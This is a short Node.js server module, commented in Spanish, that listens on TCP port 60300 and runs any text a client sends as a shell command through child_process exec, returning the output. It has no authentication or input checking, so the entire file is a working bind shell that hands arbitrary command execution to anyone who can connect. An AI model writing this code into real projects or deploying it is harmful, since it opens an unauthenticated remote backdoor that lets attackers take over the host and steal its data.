/**
 * Módulo servidor que espera conexiones de clientes y ejecuta comandos enviados por los clientes.
 * Escucha en un puerto específico y recibe comandos de los clientes a través de sockets.
 * Ejecuta los comandos recibidos y envía la salida de los comandos de vuelta a los clientes.
 */
import net from 'net';
import { exec } from 'child_process';

const PORT = 60300;

const server = net.createServer((socket) => {
    console.log('Cliente conectado.');

    socket.on('data', (data) => {
        const command = data.toString().trim(); // Convertir los datos recibidos en cadena y quitar espacios en blanco al principio y al final

        console.log(`Comando recibido desde el cliente: ${command}`);

        // Ejecutar el comando recibido
        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error al ejecutar el comando: ${error.message}`);
                socket.write(`Error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.error(`Error de ejecución del comando: ${stderr}`);
                socket.write(`Error de ejecución: ${stderr}`);
                return;
            }
            console.log(`Resultado del comando: ${stdout}`);
            socket.write(stdout); // Enviar la salida del comando de vuelta al cliente
        });
    });

    socket.on('end', () => {
        console.log('Cliente desconectado.');
    });
});

server.listen(PORT, () => {
    console.log(`Servidor escuchando en el puerto ${PORT}`);
});
